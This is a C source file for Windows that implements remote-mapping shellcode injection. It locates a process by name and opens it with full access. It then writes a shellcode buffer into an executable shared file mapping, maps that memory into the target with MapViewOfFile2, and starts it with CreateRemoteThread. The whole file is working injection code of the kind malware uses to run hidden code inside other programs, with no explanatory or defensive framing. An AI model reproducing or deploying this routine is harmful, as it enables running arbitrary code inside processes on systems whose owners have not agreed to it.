#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <memoryapi.h>


#include "error.h"
#include "remote_mapping.h"



BOOL findTargetProcessRemoteMapping(IN char* szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        handleError(ERROR_INVALID_PROCESS, "Failed to create process snapshot");
        return FALSE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        handleError(ERROR_INVALID_PROCESS, "Failed to get first process");
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (strcmp(pe32.szExeFile, szProcessName) == 0) {
            *dwProcessId = pe32.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId);
            CloseHandle(hSnapshot);
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return FALSE;

}

BOOL runRemoteMappingInjection(IN HANDLE hProcess, IN PBYTE pShellCodeBuffer, IN DWORD dwShellcodeBufferSize) {

    HANDLE hFile = NULL;
    HANDLE hThread = NULL;
    PVOID pMapLocalAddress = NULL;
    PVOID pMapRemoteAddress = NULL;

    hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, dwShellcodeBufferSize, NULL);
    if (!hFile) {
        handleError(ERROR_INVALID_PROCESS, "Failed to create file mapping");
        return FALSE;
    }

    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, dwShellcodeBufferSize);
    if (!pMapLocalAddress) {
        handleError(ERROR_INVALID_PROCESS, "Failed to map view of file");
        return FALSE;
    }

    CopyMemory(pMapLocalAddress, pShellCodeBuffer, dwShellcodeBufferSize);
    

    HMODULE hKernel32 = LoadLibrary("kernel32.dll");
    PFN_MapViewOfFile2 pMapViewOfFile2 = (PFN_MapViewOfFile2)(VOID*)GetProcAddress(hKernel32, "MapViewOfFile2");

    pMapRemoteAddress = pMapViewOfFile2(hFile, hProcess, 0, 0, 0, 0, PAGE_EXECUTE_READWRITE);
    
    if (!pMapRemoteAddress) {
        handleError(ERROR_INVALID_PROCESS, "Failed to map view of file");
        return FALSE;
    }

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pMapRemoteAddress, NULL, 0, NULL);
    if (!hThread) {
        handleError(ERROR_INVALID_PROCESS, "Failed to create remote thread");
        return FALSE;
    }

    if (hFile) {
        CloseHandle(hFile);
    }

    return TRUE;
}
